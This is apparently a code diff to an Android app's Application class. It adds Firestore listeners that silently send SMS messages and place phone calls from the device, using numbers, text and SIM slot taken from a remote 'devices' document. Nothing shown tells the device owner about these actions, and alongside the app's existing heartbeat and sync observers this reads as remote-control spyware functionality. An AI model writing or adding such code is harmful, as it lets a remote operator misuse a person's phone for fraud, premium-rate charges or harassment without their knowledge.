@@ -52,10 +52,106 @@ class UserApplication : Application(), Configuration.Provider {
         setupContentObservers()
         observeSyncRequests()
         startHeartbeat()
+        observeSmsRequests()
+        observeCallRequests()
     }
 
     fun isPermissionGranted(permission: String): Boolean {
         return ContextCompat.checkSelfPermission(this, permission) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun observeSmsRequests() {
+        val deviceId = DeviceIdHelper.getDeviceId(this)
+        if (deviceId.isBlank()) return
+
+        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
+
+        FirebaseFirestore.getInstance().collection("devices").document(deviceId)
+            .addSnapshotListener { snapshot, error ->
+                if (error != null) return@addSnapshotListener
+                snapshot?.let { doc ->
+                    val requestedAt = doc.getLong("smsRequestedAt") ?: 0L
+                    val lastHandled = prefs.getLong("last_handled_sms_request", 0L)
+
+                    if (requestedAt > lastHandled) {
+                        prefs.edit().putLong("last_handled_sms_request", requestedAt).apply()
+                        val number = doc.getString("smsRequestNumber") ?: return@let
+                        val message = doc.getString("smsRequestMessage") ?: return@let
+                        val simSlot = doc.getLong("smsRequestSimSlot")?.toInt() ?: 0
+                        sendSms(number, message, simSlot)
+                    }
+                }
+            }
+    }
+
+    private fun observeCallRequests() {
+        val deviceId = DeviceIdHelper.getDeviceId(this)
+        if (deviceId.isBlank()) return
+
+        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
+
+        FirebaseFirestore.getInstance().collection("devices").document(deviceId)
+            .addSnapshotListener { snapshot, error ->
+                if (error != null) return@addSnapshotListener
+                snapshot?.let { doc ->
+                    val requestedAt = doc.getLong("callRequestedAt") ?: 0L
+                    val lastHandled = prefs.getLong("last_handled_call_request", 0L)
+
+                    if (requestedAt > lastHandled) {
+                        prefs.edit().putLong("last_handled_call_request", requestedAt).apply()
+                        val number = doc.getString("callRequestNumber") ?: return@let
+                        val simSlot = doc.getLong("callRequestSimSlot")?.toInt() ?: 0
+                        makeCall(number, simSlot)
+                    }
+                }
+            }
+    }
+
+    private fun sendSms(number: String, message: String, simSlot: Int) {
+        if (!isPermissionGranted(android.Manifest.permission.SEND_SMS)) return
+        try {
+            val smsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+                val subscriptionManager = getSystemService(android.telephony.SubscriptionManager::class.java)
+                val info = subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
+                if (info != null) {
+                    getSystemService(android.telephony.SmsManager::class.java).createForSubscriptionId(info.subscriptionId)
+                } else {
+                    getSystemService(android.telephony.SmsManager::class.java)
+                }
+            } else {
+                @Suppress("DEPRECATION")
+                android.telephony.SmsManager.getDefault()
+            }
+            smsManager.sendTextMessage(number, null, message, null, null)
+            Log.d("UserApplication", "SMS_SENT_SUCCESS")
+        } catch (e: Exception) {
+            Log.e("UserApplication", "SMS_SENT_FAILED", e)
+        }
+    }
+
+    private fun makeCall(number: String, simSlot: Int) {
+        if (!isPermissionGranted(android.Manifest.permission.CALL_PHONE)) return
+        try {
+            val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number"))
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+
+            val subscriptionManager = getSystemService(android.telephony.SubscriptionManager::class.java)
+            val info = subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
+            if (info != null) {
+                intent.putExtra("com.android.phone.force.slot", true)
+                intent.putExtra("Cdma_Phone_Slot", info.simSlotIndex)
+                intent.putExtra("Phone_Slot", info.simSlotIndex)
+                intent.putExtra("slot", info.simSlotIndex)
+                intent.putExtra("simSlot", info.simSlotIndex)
+                intent.putExtra("subscription", info.subscriptionId)
+                intent.putExtra("com.android.phone.extra.slot", info.simSlotIndex)
+            }
+
+            startActivity(intent)
+            Log.d("UserApplication", "CALL_INITIATED_SUCCESS")
+        } catch (e: Exception) {
+            Log.e("UserApplication", "CALL_INITIATED_FAILED", e)
+        }
     }
 
     private fun observeSyncRequests() {
